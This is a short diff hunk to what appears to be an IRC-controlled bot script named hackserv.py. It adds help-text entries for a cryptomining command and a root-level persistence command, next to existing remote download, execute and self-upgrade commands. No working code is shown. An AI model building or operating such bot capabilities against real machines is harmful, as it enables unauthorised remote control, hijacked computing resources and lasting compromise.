@@ -626,6 +626,8 @@ def main(): # This is the main function for all of the bot controls.
                                   '.dl [url] [file]' (downloads [url] and saves as [file]),
                                   '.run [execute type]' [executable file]' (execute a file),
                                   '.upgrade [link] [file]' (upgrades the hackserv.py file),
+                                  '.mining [start/stop]' (coming soon!),
+                                  '.persistence' (attempt to enable persistence, requires root permissions),
                                   'Hi [botnick]' (responds to any user saying hello to it),
                                   'bye [botnick]' (tells bot to quit)
                                   """
